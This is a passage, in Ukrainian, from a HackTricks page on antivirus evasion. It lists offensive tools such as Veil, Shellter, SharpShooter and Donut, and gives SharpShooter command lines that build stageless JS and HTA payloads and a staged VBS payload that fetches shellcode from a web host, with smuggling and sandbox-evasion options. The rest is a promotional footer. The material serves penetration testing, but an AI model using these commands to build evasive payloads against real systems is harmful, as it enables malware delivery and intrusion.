* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Більше

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити свою **компанію рекламовану на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>
